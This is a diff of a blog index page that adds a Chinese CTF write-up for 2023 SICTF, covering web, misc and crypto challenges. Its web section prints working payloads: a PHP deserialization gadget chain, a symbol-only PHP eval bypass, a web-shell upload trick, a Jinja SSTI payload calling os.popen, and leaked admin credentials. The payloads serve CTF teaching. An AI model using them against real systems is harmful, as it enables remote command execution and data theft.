@@ -172,6 +172,112 @@
         
 
 <div class="post">
+    <a href="/2023/01/19/2023SICTF%E9%83%A8%E5%88%86wp/">
+        <h2 class="post-title">2023SICTF部分wp</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/1/19
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p>@<a href="%E8%BF%99%E9%87%8C%E5%86%99%E7%9B%AE%E5%BD%95%E6%A0%87%E9%A2%98">TOC</a></p>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><p><strong>兔年大吉</strong><br>首先找到利用点<br>在Happy类中有一个<br>Call_user_func()函数<br>1.	当访问不存在方法时调用__call,于是在Nevv类中发现check()方法, <img src="https://img-blog.csdnimg.cn/55b6aa2ef90f43748d3fd88026ad26a5.png" alt="在这里插入图片描述">所有类都没有该方法<br>2.	当将类作为函数调用的时候执行__invoke,于是<img src="https://img-blog.csdnimg.cn/f96cf980ba074db3bbf9f70895d03e8f.png" alt="在这里插入图片描述"><br>3.	访问不存在的方法的时候执行__get,于是</p>
+<p><img src="https://img-blog.csdnimg.cn/1ae64799bf8940eb80cead60d10afc8e.png" alt="在这里插入图片描述"><br>那么为什么不是Year类中的firecrackers()方法呢?在该方法中进行的是赋值,会调用__set而不是__get</p>
+<ol start="4">
+<li>   上面说了,对无法访问的属性进行赋值会调用__set,所以<img src="https://img-blog.csdnimg.cn/0bcc6b99a1e648dca99d62200e5a867b.png" alt="在这里插入图片描述"><br>5.<img src="https://img-blog.csdnimg.cn/408f50d853d74ea290b1496c9a61aa10.png" alt="在这里插入图片描述"><br>于是构造代码如下</li>
+</ol>
+<pre><code class="php">&lt;?php
+class Happy&#123;
+    private $cmd=&quot;system&quot;;
+    private $content=&quot;tac /flag&quot;;
+&#125;
+class Nevv&#123;
+    private $happiness;
+    public function __construct($happiness)&#123;
+        $this-&gt;happiness = $happiness;
+    &#125;
+&#125;
+class Rabbit&#123;
+    private $aspiration;
+    public function __construct($aspiration)&#123;
+        $this-&gt;aspiration = $aspiration;
+    &#125;
+    public function __set($name,$val)&#123;
+        return @$this-&gt;aspiration-&gt;family;//3
+    &#125;
+&#125;
+class Year&#123;
+    public $key=&quot;happy new year&quot;;
+    public $rabbit;
+&#125;
+$pop = new Year();
+$Y = new Year();
+$Y-&gt;rabbit = new Nevv(new Happy());
+$R = new Rabbit($Y);
+$pop-&gt;rabbit = $R;
+$R-&gt;aspiration = 1;
+echo urlencode((serialize($pop)));
+</code></pre>
+<p>exp:<code>O%3A4%3A%22Year%22%3A2%3A%7Bs%3A3%3A%22key%22%3Bs%3A14%3A%22happy+new+year%22%3Bs%3A6%3A%22rabbit%22%3BO%3A6%3A%22Rabbit%22%3A1%3A%7Bs%3A18%3A%22%00Rabbit%00aspiration%22%3BO%3A4%3A%22Year%22%3A2%3A%7Bs%3A3%3A%22key%22%3Bs%3A14%3A%22happy+new+year%22%3Bs%3A6%3A%22rabbit%22%3BO%3A4%3A%22Nevv%22%3A1%3A%7Bs%3A15%3A%22%00Nevv%00happiness%22%3BO%3A5%3A%22Happy%22%3A2%3A%7Bs%3A10%3A%22%00Happy%00cmd%22%3Bs%3A6%3A%22system%22%3Bs%3A14%3A%22%00Happy%00content%22%3Bs%3A9%3A%22tac+%2Fflag%22%3B%7D%7D%7D%7D%7D</code><br><strong>ezbypass</strong><br><img src="https://img-blog.csdnimg.cn/21f25214a74f472482c9c7d9db6fe547.png" alt="在这里插入图片描述"></p>
+<p>可用的字符为<br>  ! $ ‘ ( ) + , . &#x2F; ; &#x3D; [ ] _<br>  最终exp<br>  <code>$%DF=(_/_._)[&#39;!&#39;==&#39;_&#39;];$_=%2B%2B$%DF;$%DE=_;$%DE.=%2B%2B$_.$%DF;$_%2B%2B;$_%2B%2B;$%DE.=%2B%2B$_;$%DE.=%2B%2B$_;$$%DE[__]($$%DE[_]);&amp;__=system&amp;_=cat /flag</code></p>
+<p>含义</p>
+<pre><code class="php">$%DF=(_/_._)[‘!’==’_’];//NAN
+$_=++$%DF;//O
+$%DE=_;//_
+$%DE.=++$_.$%DF;//_P
+$_++;//Q
+$_++;//R
+$%DE.=++$_;//_POS
+$%DE.=++$_;//_POST
+$$%DE[__]($$%DE[_]);//$_POST[__]($_POST[_])
+</code></pre>
+<p>用hackbar打不上去,建议用bp打,也可能是我操作的问题<br><strong>ezupload</strong><br><img src="https://img-blog.csdnimg.cn/b25266f815474be391d1cf89594dc7a0.png" alt="在这里插入图片描述">黑名单中没有php,有pHp但是没用,因为在判断的时候会先转小写<br>所以小马可以直接传上去<br>我们传上去的文件会被重命名移动到upload’.’&#x2F;‘.date(“His”).rand(114,514).$file_ext<br>本地生成date<br><img src="https://img-blog.csdnimg.cn/dd567149c9554b5a9798ad19ef0d4a52.png" alt="在这里插入图片描述"><br>然后由于我们不知道上传的时候date是什么,所以干脆bp多传几个,然后在这个时间段内随便找一个date去打<br><img src="https://img-blog.csdnimg.cn/efed1a62407346358d248d5db594915e.png" alt="在这里插入图片描述"><br>在上传的过程中本地生成一个date值,然后bp跑114到514<br><img src="https://img-blog.csdnimg.cn/81e5acd06e6c4f73994d1fbf78d4d7ad.png" alt="在这里插入图片描述"><br>访问该路径<br><img src="https://img-blog.csdnimg.cn/49c63f54aeca4a4a985eae311fdbe8d9.png" alt="在这里插入图片描述"></p>
+<p><strong>SSTI</strong><br>F12说GET提交SI<br>过滤了很多关键字,最终exp<br><code>&#123;%print( lipsum['__glo'+'bals__'].os['po'+'pen']('tac /ga1f').read() )%&#125;</code><br><strong>ezphp</strong><br>未修复<img src="https://img-blog.csdnimg.cn/2c3d912d531c44eea4fea11e7c38aea2.png" alt="在这里插入图片描述"><br>未修复的时候顺便读了下db.php<img src="https://img-blog.csdnimg.cn/7a42484d3b84422dbc862c22b2d5d677.png" alt="在这里插入图片描述"><br>结果修复之后密码没改<br>admin<br>0909876qwe222<br>直接登录<br>然后admin.php界面post提交url&#x3D;index.php<img src="https://img-blog.csdnimg.cn/45c5d7ee903941959830a6f9a31cb02e.png" alt="在这里插入图片描述"><br>再提交x9ad.php</p>
+<p><img src="https://img-blog.csdnimg.cn/e5178e90c63b42e39e7957cfa8c36270.png" alt="在这里插入图片描述"><br>发现是反序列化<br><img src="https://img-blog.csdnimg.cn/d78c148637de4f779961f38c7c285f59.png" alt="在这里插入图片描述"></p>
+<p>exp:<code>TzoxOiJhIjoxOntzOjY6IgAqAGNtZCI7czoyMDoic3lzdGVtKCd0YWMgL2ZsYWcnKTsiO30</code></p>
+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><p><strong>签到打卡完成</strong><br>传不了图<br>向公众号发SICTF,得到flag<br><strong>Color</strong><br>Stegsolve打开图片,random color map 多换几个,能出个可以扫的码<br>扫码得到flag</p>
+<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><p><strong>Ascii</strong><br>异或3之后base32 base64<br><strong>babyRsa</strong><br>由代码可得n是由多个小的素数得到的,factor分解<br>然后工具一把梭<br><img src="https://img-blog.csdnimg.cn/5548451d2ce74039b252f1d25914d893.png" alt="在这里插入图片描述"><br><strong>Polyrsa</strong><br>pq为多项式,计算k<br><img src="https://img-blog.csdnimg.cn/9814d0a2011344eea7e585c66de196a6.png" alt="在这里插入图片描述"><br>然后算出pq工具一把梭<img src="https://img-blog.csdnimg.cn/310269f3992248cea416c6175b1811f8.png" alt="在这里插入图片描述"></p>
+<p>sage代码如下</p>
+<pre><code class="python">n = 2931835714514227696649197851452018066969814603905505893064829694548691616628661422451386639398824072768907608195113790730392677411502544741840786734616614308622423513064577929715025601090611378413475093510051291
+PR.&lt;k&gt; = PolynomialRing(ZZ)
+p = 18*k**5 + 9*k**4 - 20*k**3 - 144*k + 47527
+q = k**6 + 22*k**3 - 149*k**2 - 14*k + 39293
+n0 = p * q
+f = n - n0
+sol = f.roots()
+print(sol)
+</code></pre>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #03a9f4">网络安全</a>
+        </span>
+        
+    </div>
+    <a href="/2023/01/19/2023SICTF%E9%83%A8%E5%88%86wp/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
     <a href="/2023/01/19/SICTF%E5%89%A9%E4%BD%99crypto%E5%A4%8D%E7%8E%B0/">
         <h2 class="post-title">SICTF剩余crypto复现</h2>
     </a>
@@ -278,17 +384,17 @@ print(two_squares(n))
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00bcd4">网络安全</a>
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">网络安全</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/python/" style="color: #ff7d73">python</a>
+            <a href="/tags/python/" style="color: #00a596">python</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/" style="color: #ffa2c4">开发语言</a>
+            <a href="/tags/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/" style="color: #ff7d73">开发语言</a>
         </span>
         
     </div>
